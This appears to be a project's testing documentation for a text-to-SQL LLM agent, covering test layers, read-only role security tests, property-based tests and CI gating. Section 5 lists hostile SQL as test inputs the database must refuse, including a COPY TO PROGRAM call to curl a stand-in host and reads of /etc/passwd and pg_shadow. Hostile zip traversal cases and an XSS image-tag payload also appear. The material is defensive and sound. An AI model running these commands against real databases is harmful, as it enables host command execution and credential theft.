# Testing

> **Status: the suite and its gates are built and enforced.** 1,640 collected cases across four layers; the security layer is a separately-named CI gate; **coverage is enforced at `fail_under = 85` and measured 85.12%** — wired 2026-08-12, after sitting configured and unexecuted since Stage 0. Load and soak results remain **TBD — v2.0**: they need a running deployment and a pipeline to run it in, and the concurrency half of that question is already asserted deterministically in `tests/unit/test_concurrency.py`.

---

## 1. Philosophy

Three claims this project makes, in descending order of how badly a false claim would reflect:

1. **The blast radius is bounded.** ← must be *proven*, not asserted
2. Validation catches invalid SQL before execution.
3. The agent recovers from errors.

Testing effort follows that ordering. Claim 1 gets **negative tests that must fail** — the read-only role must be *unable* to write. A green test suite that never tried to write proves nothing.

**Non-determinism is handled by testing the harness, not the model.** LLM output cannot be asserted on directly. So: the agent's *plumbing* (does an error reach the retry loop? is the retry budget enforced? is the row limit clamped?) is tested deterministically with a fake LLM, and model *quality* is measured by the eval harness in [../ml/EVALUATION.md](../ml/EVALUATION.md). Conflating the two produces a flaky test suite and an unmeasured model.

## 2. Test pyramid

| Layer | Count | Speed | Dependencies |
|---|---|---|---|
| Unit | Most | ms | None — fakes throughout |
| Integration | Some | seconds | Real Postgres via testcontainers |
| **Security (negative)** | **Small, non-negotiable** | seconds | Real Postgres |
| Contract (MCP) | Small | seconds | Real MCP servers |
| End-to-end | Few | tens of seconds | Everything, fake LLM |
| Load | Few | minutes | Everything |
| Eval | Separate | many minutes | Everything, **real LLM** |

Eval is deliberately outside the test suite — it costs money, it is non-deterministic, and it produces measurements rather than pass/fail. It runs on demand and per release, not per commit.

**The eval *harness*, however, is ordinary code and is tested like it.** The machinery that decides what a number means — result comparison, Recall@k, the failure taxonomy, resumption — has no model and no database anywhere near it, which is the point of the injected answerer seam. That logic has to be trustworthy *before* tokens are spent producing numbers with it, because a wrong comparison produces a plausible score rather than a failure.

## 3. Unit tests

Fast, isolated, no I/O. The bulk of the suite.

High-value targets:

- **sqlglot AST validation** — every rejection path: multiple statements, DML nodes, DDL nodes, unknown identifiers, `SELECT` nested inside a CTE that is not read-only.
- **Row-limit injection** — no existing `LIMIT`; larger existing `LIMIT`; smaller existing `LIMIT` (the smaller must win); `LIMIT` inside a subquery.
- **Error classification** — each database error maps to the right `error_type`, since the retry prompt branches on it.
- **Retry budget** — exhaustion raises rather than looping.
- **Settings validation** — out-of-range values fail at startup, client values clamp to ceilings.
- **Prompt assembly** — stable prefix is byte-identical across requests (the prompt-cache precondition).
- **Result comparison** — every rule in [../ml/EVALUATION.md](../ml/EVALUATION.md) §1.1, one test each, written as an executable copy of that table. This is the highest-value unit test in the project: a bug in `compare` does not raise, it returns a *number*, and the number looks exactly like a correct one.
- **The query endpoint** — which fields are accepted (and that `stream` and `session_id` are refused *by name*), that `explain_only` validates without executing and says so with `executed: false`, that a validation failure publishes no identifier and no nearest-match suggestion, and that blocking work leaves the event loop. That last one is asserted by recording `threading.current_thread().name` inside the fake executor, because "it is on a worker thread" is otherwise a claim nobody checks.
- **The concurrency cap** — over-limit requests refused rather than queued, a slot released when a request *fails* (a semaphore leaked on the error path is a service that refuses everything after N failures and recovers only on restart), and sequential requests not limited, since the cap is on concurrency and not a rate.
- **The body cap** — an oversized body refused with `413`, a **lying `Content-Length`** not getting through, a refusal still carrying a request id, and an ordinary request unaffected. The third matters because the cap runs outside the correlation middleware and has to assign its own.
- **Eval resumption** — an *answered* question is not asked again, one that failed on infrastructure is re-attempted and overwrites its record, the summary covers the whole run rather than the last invocation, and a resume with a different model or commit is refused. One test runs the whole scenario the feature exists for: a budget that runs out mid-run, then a second invocation that finishes the split. Another asserts that the predicate deciding what to retry is the same one deciding what leaves the scored denominator — they are the same claim, and they were not the same code.
- **Profiling bounds** — identifier resolution happens *before* any statement is composed (asserted with a connection that raises on any access, so the ordering is tested rather than the outcome); type eligibility for extremes; sample-size clamping.

The LLM is a fake that returns scripted responses, so retry, decomposition, and self-correction logic is fully testable without a live model.

## 4. Integration tests

Real PostgreSQL via `testcontainers`, with pgvector.

**Not SQLite, not a mock.** The security model *is* Postgres role enforcement; testing it against anything else tests nothing. The container is created per session, and per-test isolation comes from transaction rollback.

Covers: migrations up and down; role and grant creation; vector round-trip and ANN retrieval; statement timeout actually firing; connection pool exhaustion behaviour; audit-log writes; and profiling behaviour that has no useful fake — what `count(DISTINCT)` does to a `json` column, what `reltuples` reports before an `ANALYZE`, and whether a statement composed from a catalog name actually runs.

## 5. Security tests — the ones that must fail

**These gate every release.** Each asserts the read-only role is *denied*. A test here that passes when it should fail means the containment story is broken.

```python
@pytest.mark.parametrize(
    "statement",
    [
        "INSERT INTO orders (id) VALUES (1)",
        "UPDATE orders SET total_amount = 0",
        "DELETE FROM orders",
        "TRUNCATE orders",
        "CREATE TABLE evil (id int)",
        "DROP TABLE orders",
        "ALTER TABLE orders ADD COLUMN x int",
        "CREATE INDEX ON orders (id)",
        "COPY orders TO PROGRAM 'curl evil.example'",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_ls_dir('/')",
        "SELECT * FROM agent_meta.query_audit",
        "SELECT * FROM agent_meta.sessions",
        "SELECT * FROM pg_shadow",
    ],
)
def test_readonly_role_is_denied(ro_connection, statement):
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        ro_connection.execute(statement)
```

The two easiest to omit and most damaging to miss:

- **`pg_read_file` / `COPY ... TO PROGRAM`** — without `EXECUTE` revoked on functions, a `SELECT`-only role can read files off the database host. Blocking DML while leaving these reachable is not a read-only role.
- **`agent_meta` reads** — generated SQL must not be able to read the audit log, session history, or embeddings.

Additional cases:
- Every AST rejection path is re-tested end-to-end through `execute_sql` — it must reject independently, not rely on the caller having validated first.
- Stacked queries (`SELECT 1; DROP TABLE x`).
- Prompt-injection fixtures: sampled values and column comments containing instruction-shaped text. The assertion is not "the model ignored it" (unassertable) but "whatever SQL results is still `SELECT`-only, still row-limited, still runs under the read-only role."

**Disclosure tests** are the other half of the negative suite, and they invert the question: the role tests assert the database *refuses*, these assert the system *withholds*. Two files carry them.

- **What may reach a prompt.** A planted secret in a catalog element's serialized text is absent from the rendered prompt, plus an assertion that the *whole* serialized string is absent — so a value the test never considered is excluded with it — and an allowlist assertion writing out exactly what the model receives, line by line. Deliberately brittle: that assertion *is* the network boundary, and changing what crosses it should require editing a list.
- **What a profile may reveal.** A sensitively-named column yields nothing even with sampling on; a value occurring once is withheld while a common one is not; a caller cannot request raw samples into existence. One test turns sampling *on* and asserts values do appear — without it, every negative test above would also pass if the feature were simply broken.

**Archive tests** are the newest kind, and the only ones whose subject is the filesystem rather than the database. Each builds a hostile zip — a member named `../../escaped.txt`, a backslash-separated traversal, a Windows drive letter, a symlink pointing at `/etc`, a member that expands past its budget — and asserts the loader refuses it. Each also asserts the file is genuinely **not on disk** afterwards, because a refusal that happened to write somewhere harmless is not evidence of a control. One positive test sits among them, checking that an ordinary nested path still extracts: it is what caught a symlink check that rejected every archive `ZipFile.writestr` produces, since those record permission bits with no file-type field at all.

Two lessons from the archive tests are worth stating separately, because both are about the suite rather than the code.

- **Test the intersection, not just each case.** When extraction gained a second verdict — skip an unrepresentable name, refuse an escaping one — a member that is *both* (`..` ends in a dot, which Windows cannot store) took the new path and was skipped instead of refused. Neither existing suite covered the overlap; the traversal suite went red only because the escape check had moved wholesale. There is now a test for the intersection specifically.
- **Assert the premise, not only the mitigation.** `tests/security/test_dsn_handling.py` asserts that psycopg really does quote the connection string in a parse error, alongside asserting that the redaction removes it. Without the first, a driver change that stopped leaking would leave a redaction nobody could tell was still necessary — and a redaction whose necessity is unproven is indistinguishable from one that has quietly stopped working.
- **A test whose premise turns out to be wrong is a finding, not a rename.** An integration test asserted that `LIKE` case sensitivity was "a genuine engine difference the verifier catches". It was not an engine difference at all — it was a transpilation gap, and fixing it made the test fail by returning the *right* answer. The test now uses a difference no transpilation can close (a mixed-storage column forced to `text`), and the old comment is preserved in the new one, because the mistake it records is the same one that misfiled 213 questions against the conversion.
- **Assert what a third-party parser actually does, not what it should.** Two rules in the verifier depend on sqlglot's representation and both would be silently wrong on a reasonable guess: `NOT LIKE` is a `Like` node with `negate=True` rather than a `Not` wrapping a `Like`, and `.name` on the `1 + 1` in `LIMIT 1 + 1` answers `'1'` because it returns the leftmost leaf. Each has a test naming the trap.

A third kind appears here and nowhere else: **source-level assertions**. That no identifier is interpolated into SQL, that raw values are read in exactly one function, that the sensitivity check precedes the statistics call. They check the shape of a module rather than its behaviour, which is unusual and deliberate — the property being protected is that someone changing the file can *see* what they are changing.

**Boundary tests** are the newest kind, and their adversary is different from every other file here: someone with nothing but the ability to send an HTTP request. Every other test in this suite assumes an attacker who already reached the machine.

- `tests/security/test_api_boundary.py` — the service is closed by default (loopback enforced, OpenAPI off, no CORS origin trusted); the probes reveal nothing (a fixed body for `/health`, two words per dependency for `/ready`); the error envelope publishes no exception text; and `X-Request-Id` is replaced rather than echoed. Every I/O boundary is faked through `create_app(resource_factory=...)`, deliberately — a security suite that needed Docker would be the first thing to get skipped.
- `tests/unit/test_api_sse.py` — the event framing, whose whole subject is the newline. SSE ends a field at `
` and an event at `

`, so a raw newline in a payload does not corrupt the frame, it *ends* it, and the rest is parsed as a forged event. **Generated SQL is routinely multi-line**, so this is the ordinary case rather than an attack. The tests include the full forged-`done` payload and both JavaScript line separators (U+2028/U+2029), which are not newlines to Python but are to every browser client.
- `tests/unit/test_api_stream.py` — the four properties a stream has and a JSON response does not: a slot is taken *before* the response begins, a slot comes back however the stream ends **including a client hanging up**, exactly one terminal event, and a streamed failure publishes no more than the non-streaming path does. The last is the one that could quietly diverge, since a stream cannot use the exception handlers.
- `tests/security/test_readonly_assertion.py` — `assert_read_only` against a real PostgreSQL, in **both directions**. It passes for the read-only role and *fails* for the owner connection, because a check that has only ever been run against a passing case is a check nobody has seen work.

Two more lessons, both about what a test holds fixed rather than what it asserts:

- **A control tested only against the fixture that satisfies it has been tested against itself.** The thirty role tests above are the example. All of them build `sql_agent_ro` from migration 002 in a testcontainer, and none looks at the role a deployment connects as — so they proved the migration was right and said nothing about production, for nineteen versions. The gap is closed by a startup assertion, not by another test ([ADR-033](../architecture/DECISIONS.md#adr-033--the-read-only-role-is-proved-at-startup-by-asking-rather-than-by-writing)). When a control has tests, the question is not *is it tested* but *what does the fixture hold fixed*.
- **A leak test must plant something identifiable and assert its absence in the whole response**, not check a field. The readiness test raises a probe error containing a password, an internal hostname and an IP, then asserts none of the three appear anywhere in `response.text` — because the failure being guarded against is a *new* path that renders the exception, and a field-level assertion cannot see one.

## 6. Contract tests (MCP)

Against real servers over the real transport — `python -m mcp_servers.<name>` launched as an actual subprocess, speaking actual JSON-RPC over stdio, against an actual Postgres. Nothing is mocked, because every interesting failure in an MCP integration lives in the parts a mock replaces: process launch, message framing, and whether stdout stayed clean.

- `tools/list` returns valid JSON Schema for every tool, and the schema the *client* receives is byte-identical to the one the server published.
- Every declared input constraint is enforced server-side — `maximum`, `enum`, `required`, `additionalProperties`. **Not just declared: enforced.** A schema constraint the server does not check is documentation, not a limit.
- Errors return `isError: true` with structured content, never a protocol-level exception — **and the session survives**. If a bad argument killed the session, one malformed call would end the conversation, and a model will produce malformed calls.
- Published ceilings equal the enforced ones. Asserted as `schema["maximum"] == MAX_K`, not against a literal, so the two cannot drift apart.
- Degradation: a server that fails to start is recorded and skipped, and the others still work.
- **Schema snapshot test** — tool schemas are captured and diffed, so a breaking change to a contract fails CI rather than silently shipping. It never regenerates itself: a test that writes its own expectation passes forever. See [../architecture/MCP.md](../architecture/MCP.md) §8.

**One structural constraint worth knowing before writing more of these.** The stdio transport is built on anyio task groups, whose cancel scopes must be exited by the task that entered them — and a pytest async *fixture* runs setup and teardown in different tasks. A `yield`-based registry fixture therefore passes every assertion and then raises at teardown. Each test opens its own registry inside the test body instead, naming only the servers it needs, which also keeps the subprocess count down.

## 7. End-to-end tests

> **`tests/e2e/` exists and is empty.** It is a real layer in `TEST_LAYERS` and marker-selectable, so the first file added to it is counted without anyone remembering to do anything. Nothing goes in it until `POST /v1/query` exists — the scenarios below all start with a request.

Full stack, fake LLM with scripted responses. Deterministic.

Scenarios: happy path; validation failure → correction → success; retry budget exhausted; statement timeout; row-limit truncation flagged in the response; multi-step decomposition; MCP server unavailable → documented degradation; client disconnects mid-SSE (no leaked connection or open transaction).

The HTTP tests that exist today are deliberately **not** here. `tests/unit/test_api_health.py` and `tests/security/test_api_boundary.py` drive the app through `TestClient` with every dependency faked, which makes them unit and security tests that happen to speak HTTP. An e2e test is one where the fakes stop at the LLM.

## 8. Concurrency and load

**These are two different things, and separating them is what let the second one wait.**

**Concurrency is a correctness property**, so it runs on every commit. `tests/unit/test_concurrency.py`, 7 tests, no server and no load generator: callers at the cap all run *simultaneously* (a service that serialised everything satisfies every other admission test in this suite — only the in-flight peak tells them apart), callers over the cap are **refused rather than queued**, every slot returns after a burst of twenty and after a burst of failures, and the executor never holds more connections at once than the cap allows.

The last of those matters because `API_POOL_MAX_SIZE > API_MAX_CONCURRENT_REQUESTS` is enforced at startup as *configuration*. That only means something if one request never holds two connections — which is true today and is exactly what a later change (a follow-up query, a profiling call inside answering) would break silently.

**`locust` was pinned for this from Stage 0 and never imported.** Removed 2026-08-09 along with fifteen transitive dependencies including Flask and gevent — see [ENGINEERING_MATRIX](../project/ENGINEERING_MATRIX.md) §25. The property it was pinned for turned out not to need a load generator at all.

### These tests were verified by mutation, and the exercise found two defects in them

Three deliberate breaks to `_Admission` — remove the refusal, make `release()` a no-op, force the limit to one — each turned a subset red. Doing it found two ways the tests were weaker than they read:

**One built a fresh `QueryService` for its second batch.** That proves a new counter starts at zero and says nothing about the old one coming back down; it passed against a no-op `release()`. It now reuses the same service.

**Two blocked forever instead of failing.** The property under test is *"the caller is refused rather than made to wait"*, so a broken implementation's failure mode is an await that never returns — and an unbounded `await` turns that into a hung suite reporting nothing. **Every await that can block is now bounded by `asyncio.wait_for`.** Against the removed cap the suite now fails in five seconds naming three tests, where before it hung.

> **A concurrency test that hangs when the property breaks is worse than no test**: it fails the build with a timeout that names nothing, and locally it just stops.

### Load and soak — TBD, Stage 6

Still absent, and needing a running server and a pipeline: sustained throughput within the p95 target; behaviour past pool saturation against a real database; memory per replica over hours; the effect of one expensive query on concurrent latency. Feeds [../operations/PERFORMANCE.md](../operations/PERFORMANCE.md) §4.

**Graceful degradation past saturation is the finding that matters**, more than peak throughput. The pin can come back with the file that imports it.

## 9. Benchmark tests

`pytest-benchmark` on components with explicit budgets — retrieval < 100 ms, validation < 50 ms.

These are **regression guards, not measurements**: they fail when a component gets meaningfully slower. Reported latency numbers come from the load tests on known hardware, not from a laptop running CI.

## 10. Coverage

Target: **85% on `src/`**, with 100% on validation, limit enforcement, and error classification.

**Enforced 2026-08-12, and measured 85.12%.** `--cov` rides on the suite CI already runs, so `fail_under = 85` in `pyproject.toml` fails the build rather than describing an intention. It had been configured and unexecuted since Stage 0 — a published target that nothing measured, sitting in the file a reader would check to confirm it was measured ([RISKS R-17](../project/RISKS.md#r-17--documentation-drifts-from-implementation)).

**The margin is 0.12 points — about seven statements — and that is recorded rather than padded.** The next commit that adds an uncovered module will fail this gate. The correct response is a test. A floor that gets lowered whenever it binds has never once held, and lowering it is indistinguishable in a diff from raising coverage.

The security gate runs as a **separate invocation without `--cov`**, deliberately: coverage of that layer alone is far below the floor, so reporting it would either fail the step for the wrong reason or teach a reader to ignore a coverage line.

Coverage is a floor, not a goal. The security suite would contribute a handful of percentage points and is worth more than the rest combined — which is the argument against optimizing the number. Uncovered branches are reviewed individually; a line that is genuinely untestable gets `# pragma: no cover` **with a comment saying why**.

## 11. CI

> **TBD — Stage 6.**

| Stage | Runs |
|---|---|
| Lint | `ruff format --check`, `ruff check`, `mypy src` |
| Unit | Full unit suite |
| Integration | testcontainers Postgres |
| **Security** | **The negative suite — a failure blocks merge** |
| Contract | MCP schema snapshots |
| E2E | Fake LLM |
| Smoke eval | ~20 questions, real LLM, **release only** |

**Each row above selects by marker, which is why markers cannot be optional.** An unmarked test is not skipped — it is *deselected*, so it runs in none of these rows and appears in no report. That drifted: thirteen files had no marker, two of them under `tests/security/`, and the security row was gating on **156 of 206** tests while reporting green.

**What the API suite cannot reach, and what caught it instead.** The boundary tests drive the app with a fake pool, which is right — putting the security suite behind a Docker daemon makes it the first thing to get skipped. It also means three real defects were invisible to them: `psycopg_pool` discarding a connection its `configure` hook left in a transaction, a missing `search_path`, and an audit row written with an empty `db_role`. All three were found by starting the process and sending a request. A fake stands in for an interface; these were properties of the implementation behind it, and **the seam that makes a test fast is the seam the test cannot see past.**

**It happened again, and the second time is the more useful example.** A fourth defect passed 1306 tests: the retriever's model loaded lazily, so the startup check touched the object and left the checkpoint closed, and the first request paid twenty seconds. No fake could have caught it — the fakes have no checkpoint to leave unopened, and that is exactly what makes them fast.

What caught it was **not a test at all**. It was per-stage timing added for a user-facing feature, on a real process, against a real model. The test written afterwards (`TestStartupOpensTheModel`) asserts the startup *reads the property whose side effect is the load* — it can only protect the fix, never have found it.

So the honest statement of this suite's coverage is: it verifies behaviour against interfaces, and **it cannot verify claims about what the implementations behind those interfaces cost.** Latency, laziness, connection state and resource lifetime all live on the far side of every seam here. The countermeasure is not more fakes; it is running the thing and measuring it, which is why [PERFORMANCE.md](../operations/PERFORMANCE.md) §1 records live numbers rather than test assertions.

Markers are therefore derived from the directory in `tests/conftest.py` rather than declared per module: `tests/security/` **is** the security layer, a hand-written marker can disagree with the path, and a derived one cannot. A test outside the known layers fails collection instead of vanishing. Layers overlap where they should — a security test needing a real database carries both `security` and `integration`, so it runs in both rows.

The general rule this is an instance of: **a selection mechanism needs a way to fail, or "nothing matched" and "everything passed" are the same output.**

## 13. The browser client's tests

`web/` runs its own suite — **Vitest with jsdom, 127 tests**, 15 of them generated — separate from pytest because it is a separate language and toolchain, not because it is held to a different standard. `npm test` in `web/`; `npm run typecheck` is the other half of the gate.

**The type checker is doing real work here and is treated as part of the suite.** `strict`, plus `noUncheckedIndexedAccess` and `exactOptionalPropertyTypes`. The first is the one that matters for this codebase: `rows[i][j]` on a result set is genuinely `unknown | undefined`, and a compiler that pretends otherwise is a compiler agreeing that a ragged row cannot happen.

| Layer | What it covers |
|---|---|
| **Protocol** (`api/sse.test.ts`) | Framing: chunk boundaries in the middle of a payload, a field name, and a `\r\n`; `\r`, `\n` and `\r\n` all terminating; comments ignored; unknown fields ignored; both size bounds refusing |
| **Contract** (`api/events.test.ts`) | Every event shape the server can send, and every malformed one it must reject rather than repair |
| **Logic** (`state/reducer.test.ts`) | Ordering, settling exactly once, arrival times becoming durations |
| **Rendering** (`components/*.test.tsx`) | The claims a person reads: truncation, NULL versus empty string, and that untrusted text renders as text |
| **Integration** (`App.test.tsx`) | The whole tree driven by a fake `ReadableStream` — the joins nothing else covers |
| **Generated** (`api/sse.property.test.ts`, `sql/tokenize.property.test.ts`) | `fast-check` over the two parsers: chunk boundaries, arbitrary UTF-16, and every prefix of a generated query — see §15 |

**Three of these test properties rather than behaviour**, and those are the ones worth keeping.

**The round trip.** Concatenating every token the SQL scanner emits returns the input exactly. That is not a highlighting test; it is what stops the page from showing SQL that is not the SQL that ran. **Generated since 2026-08-10** — the claim was written down long before the input was anything but hand-picked.

**No markup, ever.** A cell value and a *column name* containing `<img src=x onerror=...>` must render as characters — asserted by `document.querySelector('img')` being null, not by comparing strings. A string comparison passes on an escaped attribute that a browser would still execute in another context; asking the DOM whether an element exists does not.

**Linearity.** The scanner is fed 50,000 doubled quotes with a wall-clock assertion. It is the input that makes the obvious regular expression catastrophically backtrack, and a frozen tab is not a failure any other test would report.

**Why `fetch` is faked rather than a server started.** The transport is one function and it is the only thing in `web/` that needs a network, so replacing it keeps the whole suite runnable with no Postgres, no model and no provider. Same reasoning as the injected answerer seam in §3 — and the same known cost, recorded in §11: **the seam that makes a test fast is the seam the test cannot see past.** Nothing in `web/` proves the real server emits the events these tests assume; that is what the recorded `curl` output in [DEMO_SCRIPT.md](../project/DEMO_SCRIPT.md) and the browser verification are for, and both are manual.

**One assertion earned its place by failing.** A test looked for the text `execute` on the page and matched two elements — the phase on the time rail and the step in the server's footer. That is not a flaky test; it is the page correctly showing **two different measurements of the same phase** ([ADR-044](../architecture/DECISIONS.md#adr-044--two-clocks-both-reported-neither-substituted-for-the-other)). The fix was to scope the query to the rail, and the ambiguity was the finding.

**Not tested, deliberately:** appearance. There are no snapshot tests and no visual regression tests. A snapshot of markup asserts that nobody changed the markup, which is true of every change, and it would have to be regenerated on every one of them — a test whose failure means nothing is worse than no test. Layout is verified by looking at it, in a browser, and that is stated as manual rather than dressed up as automated.

## 14. How CI runs this suite

`.github/workflows/ci.yml`, on every push to `main` and every pull request. Four jobs, deliberately separate so a failure names its own layer instead of reporting "CI failed": **lint** (`ruff check`, `ruff format --check`, `mypy --strict`), **python** (the whole suite, then the security layer again by name), **web** (`tsc`, `vitest`, and a production build), **docs** (relative links and anchors via `scripts/check_docs_links.py`).

**The one design decision worth explaining is what happens when Docker is missing.**

The Postgres-backed layers get their database from testcontainers, and without a daemon that fixture skips. Locally that is correct — the unit layer still runs and nobody is blocked. **In CI it is the worst available outcome**: integration and security evaporate, every remaining test passes, and the run reports green over the release gate that proves an LLM cannot write to the database.

So `require_docker()` skips locally and **raises in CI**, keyed on the `CI` environment variable:

```
Docker is unavailable, but CI is set. Refusing to skip: the integration and
security layers would vanish and the run would report green over the release
gate. Fix the runner, not this check.
```

The message names the consequence and the correct fix on purpose — an error that reads as a flaky assertion is one somebody deletes at 2am.

**The guard has its own tests** (`tests/unit/test_ci_guard.py`): that it skips without `CI`, raises with it, gets out of the way when Docker is present, and treats *any* value of `CI` as set — because a runner exporting `CI=1` would otherwise slip past a check for the literal `"true"`. §11's lesson applied to the gate itself: a safety mechanism nobody has watched fail is one that has never been tested.

**The security layer runs twice**, once inside the full suite and once as its own step. The second invocation costs seconds and buys an unambiguous line in the log: if that step is green, the release gate passed *by name* rather than by being included in a total.

**Landed 2026-08-12:** the 85% coverage floor is executed rather than configured, and a fifth **audit** job runs `pip-audit` over both requirement files and `npm audit` over both npm trees — four hard gates at any severity, no threshold ([ADR-050](../architecture/DECISIONS.md#adr-050--dependency-audits-are-hard-gates-at-any-severity-and-the-escape-hatch-is-a-named-exception)).

**Still not in the pipeline**, named rather than implied: secret and container scanning; an SBOM and a license check; and branch protection with required status checks, which are repository settings rather than a file and are the half that makes a green run mean something.

## 15. Property-based tests

**54 tests over two languages** — `hypothesis` for the 39 in Python, carrying the marker `property`, and `fast-check` for the 15 in `web/`. The Python ones live **inside the existing layers** rather than in a directory of their own — `tests/security/` for the two that are security claims, `tests/unit/` for the one that is not — so the security gate selects them without needing to know they are generated.

**The premise, and why this project needed it.** An example-based test checks the inputs somebody thought of, and the failure this codebase keeps rediscovering is that *nobody chose easy inputs — everybody chose convenient ones*. Convenient SQL is lower case, single-spaced and uncommented. Three of these properties exist because the rules they assert were already written as invariants and had only ever been checked against a handful of instances.

| Property | Where | What is generated |
|---|---|---|
| **No write is ever accepted** | `tests/security/test_property_write_containment.py` | Fifteen statement shapes × four table names × eight token separators × four casings, in five nesting positions — bare, stacked either way, inside a data-modifying CTE, inside a subquery |
| **One payload is always one event** | `tests/security/test_property_sse_framing.py` | Arbitrary JSON, plus what a database actually returns (`Decimal`, `date`, `UUID`, `bytes`), plus a hand-written list of strings designed to forge a second SSE frame |
| **No request body produces an unhandled failure, and no refusal echoes it** | `tests/security/test_property_request_body.py` | Generated JSON bodies *and* generated field names against `POST /v1/query` |
| **`truncated` means the server's limit cut** | `tests/unit/test_property_row_limit.py` | Four interacting numbers — rows available, the caller's request, the query's own `LIMIT`, and the configured ceiling — checked against a reference model written independently of the executor |

**Each suite carries its own dual, and that is not decoration.** "No write is accepted" is satisfied perfectly by a validator that refuses everything, so the same file asserts that generated `SELECT`s — including `UNION`, `INTERSECT` and CTEs — are accepted *outright*. A containment check with no false-rejection test is one that gets disabled the first time it blocks real work.

**The generators are not fuzzers, and the distinction is the whole design.** A strategy emitting arbitrary text finds parse errors, which is a fact about `sqlglot` rather than about this project. What is generated instead is plausible SQL with the incidental details varied. The one strategy that *is* arbitrary text (`st.text()` against `validate_static`) makes a correspondingly narrow claim: not that random text is rejected — `SELECT 1` is random text that should be accepted — but that the function always **returns**, because its caller is a loop and an exception there aborts a request rather than correcting it.

That same strategy is what moved [ENGINEERING_MATRIX](../project/ENGINEERING_MATRIX.md) §37 off 🔴 — narrowly. The request body followed it the same day, and the SSE parser on 2026-08-10, so all three of that row's targets now take generated input; it stays 🟡 because three shallow generators are still not a campaign.

**That narrow claim is the one that found something.** On its first run, `validate_static("$")` raised an unhandled `sqlglot.errors.TokenError`: the validator caught `ParseError`, and `TokenError` is its **sibling**, not its subclass. It is raised for an unterminated string, identifier, comment or dollar-quote — which is the exact shape of a generation that ran out of output tokens mid-literal, on the free tiers this project defaults to. Consequences, in order of how long they would have taken to notice: the caller got `internal_error` instead of an actionable `syntax_error`; the self-correction loop aborted instead of correcting; and the executor raised **before** its `outcome="rejected"` audit write, so the attempt left no trail at all. Fixed by catching the base `SqlglotError`. Twelve hundred example-based tests had not thought to end a string early.

### The property that had never failed, and what it was hiding

**2026-08-10.** `test_property_request_body.py` asserted `status_code < 500` over generated bodies and had passed on every run since it was written. It failed for the first time during an unrelated slice, on the body `{"question": "0"}`.

**Nothing in the application had changed.** The same body returned 500 on the untouched commit — verified in a clean `git worktree` before anything was edited, which is the step that turned "my change broke it" into "my change reached it". What changed was only which examples Hypothesis produced.

Two separate defects sat behind it, and both had been there since the file was written:

- **The fixture made an accepted body indistinguishable from a crash.** The shared `FakeRetriever.search` raises — a deliberate tripwire for API tests that must never reach the answering path. This file is the one place that assumption is wrong: its own docstring says an acceptable body is in scope. So a valid body produced an `AssertionError` inside the fake, rendered as `500 internal_error`, which is precisely the signature the test exists to detect.
- **The assertion measured a proxy rather than the claim.** `status < 500` stands in for "nothing crashed", and it is wrong in the safe direction too: a deliberate, enveloped `502 llm_unavailable` from a provider that is not configured would fail it identically. The claim is about *unhandled* exceptions, so it is now asserted directly — any 5xx must carry an error code other than `internal_error`, the one code that means no one decided to report this.

The fix is stricter than what it replaced on every rejected body and correct on accepted ones, and the found example is pinned as an ordinary example-based test beside the property.

**Then a sibling property in the same file failed, for a third reason, and it is the most instructive of the three.** `test_a_hostile_field_name_is_never_reflected_verbatim` asserts that a hostile field name does not come back in the response. It failed on the generated name `<unn` — which is a prefix of `<unnamed>`, the placeholder the application substitutes *because* the name was hostile. **The response was correct and the assertion was not.** That exact class of false positive had already been hit once, on the single-character name `"`, and had been "fixed" with a length floor of four characters. Four is where it failed again, and nine would fail too, because `<unnamed>` is a name a caller can send.

A length floor was never the fix. The comparison now subtracts the application's own vocabulary before asking whether the caller's text survived, and imports `api.errors.UNPRINTABLE_FIELD` rather than spelling it — a test that hardcoded the placeholder would keep passing after the string changed while checking nothing. **A substring assertion over a whole response is a check against two vocabularies at once**, and only one of them is the attacker's.

**The lesson generalises past this file.** A property that has never failed may be one whose generator has never arrived — and the corpus that decides when it arrives is *outside the repository*, accumulating in `.hypothesis/` on whichever machine ran it. That is the same shape as the v45 finding, from the other side: there, a generator agreed with the implementation and could not see the bug; here, a generator would have seen it and had not got there yet. **Neither shows up as a red test, and both look exactly like a passing suite.**

**Two profiles**, registered in `tests/conftest.py`: 100 examples locally, **500 in CI**, selected on the `CI` environment variable — the same variable the Docker guard keys on. A property test that runs the same hundred examples everywhere is an example-based test with extra machinery. `deadline=None` on both, because the code under test parses SQL and a per-example wall clock turns a slow shared runner into a failed *timing* assertion while the property holds perfectly; latency budgets live in `pytest-benchmark` (§9), where a deadline means something.

### The TypeScript half

Added 2026-08-10. `fast-check` 4.9.0 — **two packages installed, not fifteen**, which is the standard the `locust` removal set (§8). `web/src/test-setup.ts` reads the same `CI` variable for the same 100/500 split, and gets it free on GitHub Actions.

| Property | Where | What is generated |
|---|---|---|
| **Where the chunks fall cannot change what comes out** | `web/src/api/sse.property.test.ts` | Wires built from generated field lines, all three line terminators mixed, and arbitrary UTF-16 — then split at generated points, and again one character at a time |
| **A frame cannot carry a line terminator** | same | The same wires, asserting no event name holds a `\r` or `\n` and no data holds a `\r` — I-11 read from the client end |
| **`pending` tells a finished stream from a cut one** | same | Streams of complete events, then the same stream with its last character removed |
| **The token round trip** | `web/src/sql/tokenize.property.test.ts` | SQL-shaped fragments mixed with arbitrary UTF-16, plus **every prefix** of each generated query |
| **The token list is well formed** | same | No empty token, no two neighbours of one kind, and each kind's text matching the shape only its branch can produce |

**The SSE properties are checked against a reference parser written by a different algorithm** — one regular expression over the whole wire instead of a character scan with held state, `split(':')` instead of `indexOf`. A model that mirrors the implementation agrees with its bugs. One rule is copied rather than derived and the docstring says so: a whole-wire parser has no next chunk, so it cannot discover that a trailing `\r` must be held.

**Each of the seven mutations tried turned the new suites red — after the sixth was fixed.** Breaking the held carriage return, the space-stripping rule, the data reset on dispatch, the line bound's comparison, the quote scanner, the token merge, and the keyword classifier. The space-stripping mutation **survived the first draft with every property green**, because the generator emitted `data:value` and no server sends that: the separator was a fixed string where it should have been generated. The defect was in the test, and only mutating the code found it.

**Not asserted here: linearity.** The scanner's wall-clock test stays in `tokenize.test.ts` as an example. A timing assertion over generated input fails when the runner is busy, which is a failure that says nothing about the property — and a test whose red means "maybe" is one that gets ignored, then deleted.

### What is still missing

**One of section 38's five properties is not here**, named rather than implied: **the read-only connection never holds a write privilege.** It needs a real database, so generating hundreds of examples against it costs a container per example or a shared one with cross-example state. Covered by `tests/security/test_readonly_role.py` over the privileges that exist.

## 16. Failure injection

**38 tests.** Three documented behaviours that had never been demonstrated, and one of them was false.

| Dependency broken | Where | The assertion that matters |
|---|---|---|
